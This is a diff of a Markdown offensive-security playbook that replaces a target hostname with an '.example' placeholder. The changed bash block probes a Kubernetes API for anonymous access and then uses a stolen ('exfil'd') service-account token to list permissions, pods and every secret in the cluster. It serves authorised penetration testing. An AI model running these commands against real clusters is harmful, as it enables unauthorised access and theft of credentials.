@@ -305,17 +305,17 @@ curl -H "Authorization: Bearer $TOKEN" \
 
 ```bash
 # Check anonymous access on K8s API
-curl -sk "https://k8s.target.com:6443/api/v1/namespaces"
+curl -sk "https://k8s.target.example:6443/api/v1/namespaces"
 
 # Anonymous binding (system:anonymous user) — surprisingly common
-curl -sk "https://k8s.target.com:6443/api/v1/pods?limit=1"
+curl -sk "https://k8s.target.example:6443/api/v1/pods?limit=1"
 
 # If SA token exfil'd (eyJ...):
 export TOKEN="eyJ..."
-kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get namespaces
-kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify auth can-i --list
-kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get pods -A
-kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get secrets -A
+kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get namespaces
+kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify auth can-i --list
+kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get pods -A
+kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get secrets -A
 ```
 
 ### K8s privesc patterns
